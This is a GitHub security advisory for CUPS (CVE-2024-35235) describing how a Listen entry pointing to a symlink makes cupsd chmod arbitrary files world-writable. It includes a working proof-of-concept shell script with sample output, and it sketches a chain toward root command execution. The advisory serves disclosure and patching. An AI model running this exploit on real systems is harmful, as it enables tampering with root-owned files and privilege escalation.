
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FOpenPrinting%2Fcups%2Fsecurity%2Fadvisories%2FGHSA-vvwp-mv6j-hw6f)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FOpenPrinting%2Fcups%2Fsecurity%2Fadvisories%2FGHSA-vvwp-mv6j-hw6f)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=OpenPrinting%2Fcups)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[OpenPrinting](/OpenPrinting)
/
**[cups](/OpenPrinting/cups)**
Public

* [Notifications](/login?return_to=%2FOpenPrinting%2Fcups) You must be signed in to change notification settings
* [Fork
  208](/login?return_to=%2FOpenPrinting%2Fcups)
* [Star
   1.1k](/login?return_to=%2FOpenPrinting%2Fcups)

* [Code](/OpenPrinting/cups)
* [Issues
  27](/OpenPrinting/cups/issues)
* [Pull requests
  11](/OpenPrinting/cups/pulls)
* [Discussions](/OpenPrinting/cups/discussions)
* [Actions](/OpenPrinting/cups/actions)
* [Projects
  0](/OpenPrinting/cups/projects)
* [Wiki](/OpenPrinting/cups/wiki)
* [Security](/OpenPrinting/cups/security)
* [Insights](/OpenPrinting/cups/pulse)

Additional navigation options

* [Code](/OpenPrinting/cups)
* [Issues](/OpenPrinting/cups/issues)
* [Pull requests](/OpenPrinting/cups/pulls)
* [Discussions](/OpenPrinting/cups/discussions)
* [Actions](/OpenPrinting/cups/actions)
* [Projects](/OpenPrinting/cups/projects)
* [Wiki](/OpenPrinting/cups/wiki)
* [Security](/OpenPrinting/cups/security)
* [Insights](/OpenPrinting/cups/pulse)

# Cupsd Listen arbitrary chmod 0140777

Moderate

[zdohnal](/zdohnal)
published
GHSA-vvwp-mv6j-hw6f
Jun 11, 2024

## Package

cupsd

## Affected versions

<=2.4.8

## Patched versions

None

## Description

### Summary

When starting the cupsd server with a Listen configuration item pointing to a symbolic link, the cupsd process can be caused to perform an arbitrary chmod of the provided argument, providing world-writable access to the target.

### Details

This is an excerpt from a larger chain of vulnerabilities reported in Ubuntu 24.04. There is an assumption for exploitation that /etc/cups/cupsd.conf can be successfully edited (this has been omitted here as it is believed to be out of scope).

When setting up the bind for unix sockets configured in the Listen parameters of the configuration file, the code does not check for a successful call to `unlink` and `bind` prior to performing the call to `chmod`. [1]

On Ubuntu 24.04, by setting the Listen argument to a path such as `/tmp/stage/file`, where `file` is a symlink elsewhere in the system, the previous call to `unlink` for the path will fail due to AppArmor [2], and the subsequent call to `bind` will also fail due to the file still existing. The return value of the call to `bind` is not checked before the call to `chmod`, so a successfully planted symbolic link which causes the `bind` to fail will still be traversed by the call to `chmod` and the file permissions changed to be world writable.

On systems where the Ubuntu AppArmor policy is not in place, this vulnerability still exists but as a race condition between the call to `unlink` and the call to `bind`. A sufficiently fast attacker could place a symbolic link at the configured location after the call to `unlink`, causing the `bind` to fail once again and performing a successful `chmod`.

#### Suggested Fix

* Recursively open the configured paths using `openat` with `O_NOFOLLOW`, followed by using `fchmod` in place of `chmod`. This will ensure that there are no unexpected symbolic links in the path.
* Check the return value of the `bind` call before performing the `chmod` to ensure that the file is a socket. This is not perfect but can drastically narrow the race condition window.

[1]

[cups/cups/http-addr.c](https://github.com/OpenPrinting/cups/blob/aba917003c8de55e5bf85010f0ecf1f1ddd1408e/cups/http-addr.c#L229-L240)

Lines 229 to 240
in
[aba9170](/OpenPrinting/cups/commit/aba917003c8de55e5bf85010f0ecf1f1ddd1408e)

|  | unlink(addr->un.sun\_path); |
| --- | --- |
|  |  |
|  | // Save the current umask and set it to 0 so that all users can access |
|  | // the domain socket... |
|  | mask = umask(0); |
|  |  |
|  | // Bind the domain socket... |
|  | status = bind(fd, (struct sockaddr \*)addr, (socklen\_t)httpAddrLength(addr)); |
|  |  |
|  | // Restore the umask and fix permissions... |
|  | umask(mask); |
|  | chmod(addr->un.sun\_path, 0140777); |

[2] [https://git.launchpad.net/ubuntu/+source/apparmor/tree/profiles/apparmor.d/abstractions/user-tmp#n21](https://git.launchpad.net/ubuntu/%2Bsource/apparmor/tree/profiles/apparmor.d/abstractions/user-tmp#n21)
### PoC

The following script can be used for exploitation, sudo is used to emulate the above mentioned Listen configuration access.

```
set -e
exploit() {
        echo "Staging..."
        mkdir -m 777 /tmp/stage
        ln -s /etc/cups/cupsd.conf /tmp/stage/cupsd.conf

        # emulate configuration access to cupsd.conf
        echo 'Listen /tmp/stage/cupsd.conf' | sudo tee -a /etc/cups/cupsd.conf

        echo

        echo "Current permissions of cupsd.conf"
        ls -l /etc/cups/cupsd.conf
        tail -n1 /etc/cups/cupsd.conf || true

        echo

        echo "Restarting cupsd"
        sudo systemctl restart cups

        echo

        echo "New permissions of cupsd.conf"
        ls -l /etc/cups/cupsd.conf
        tail -n1 /etc/cups/cupsd.conf || true
}

cleanup() {
        sudo sed -i '/Listen \/tmp\/stage\/cupsd.conf/d' /etc/cups/cupsd.conf
        sudo chmod 640 /etc/cups/cupsd.conf
        rm -rf /tmp/stage
}

$@

```

Sample output can be seen below:

```
$ sh poc.sh exploit
Staging...
Listen /tmp/stage/cupsd.conf

Current permissions of cupsd.conf
-rw-r----- 1 root lp 4987 May 24 10:18 /etc/cups/cupsd.conf
tail: cannot open '/etc/cups/cupsd.conf' for reading: Permission denied

Restarting cupsd

New permissions of cupsd.conf
-rwxrwxrwx 1 root lp 4987 May 24 10:18 /etc/cups/cupsd.conf
Listen /tmp/stage/cupsd.conf
$ sh poc.sh cleanup

```
### Impact

Given that cupsd is often running as root, this can result in the change of permission of any user or system files to be world writable.

Given the aforementioned Ubuntu AppArmor context, on such systems this vulnerability is limited to those files modifiable by the cupsd process. In that specific case it was found to be possible to turn the configuration of the Listen argument into full control over the cupsd.conf and cups-files.conf configuration files. By later setting the User and Group arguments in cups-files.conf, and printing with a printer configured by PPD with a `FoomaticRIPCommandLine` argument, arbitrary user and group (not root) command execution could be achieved, which can further be used on Ubuntu systems to achieve full root command execution.

### Severity

Moderate

4.4

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Local

Attack complexity
Low

Privileges required
High

User interaction
None

Scope
Unchanged

Confidentiality
High

Integrity
None

Availability
None

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N

### CVE ID

CVE-2024-35235

### Weaknesses

[CWE-59](/advisories?query=cwe%3A59) [CWE-252](/advisories?query=cwe%3A252)

### Credits

* [![@rmcnamara-snyk](https://avatars.githubusercontent.com/u/139076586?s=40&v=4)](/rmcnamara-snyk)
  [rmcnamara-snyk](/rmcnamara-snyk)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

